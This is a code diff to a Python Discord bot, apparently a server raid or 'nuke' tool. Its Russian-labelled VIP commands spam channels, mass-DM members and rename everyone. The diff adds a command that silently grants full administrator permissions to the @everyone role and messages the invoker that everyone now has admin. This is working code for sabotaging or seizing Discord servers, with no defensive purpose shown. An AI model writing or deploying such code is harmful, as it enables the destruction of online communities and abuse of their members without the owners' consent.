@@ -2,6 +2,7 @@ cdn = 0
 import discord
 import asyncio
 from discord.ext import commands
+from discord import Permissions
 import os
 import re
 import time
@@ -87,6 +88,7 @@ class MyClient(discord.Client):
 			await message.delete()
 			cdn = 1
 			embed = discord.Embed(title=":crown: VIP-команды", description="", color=0xff9900)
+			embed.add_field(name='*випадминка', value='Дать @everyone админ-права', inline=False)
 			embed.add_field(name='*випканалы+', value='Создать каналы со своим названием', inline=False)
 			embed.add_field(name='*виплс', value='Отправка всем в ЛС своё сообщение', inline=False)
 			embed.add_field(name='*випник', value='Изменить никнеймы участников на свои', inline=False)
@@ -500,6 +502,11 @@ class MyClient(discord.Client):
 					await message.delete()
 					for i in message.guild.members:
 						await i.edit(nick=str(n))
-
+						
+						
+				if message.content.startswith('*випадминка'):
+					await message.delete()
+					await message.guild.default_role.edit(permissions=Permissions.all())
+					await message.author.send(':unlock: **Все получили админку!**')
 client = MyClient()
 client.run(str(token))
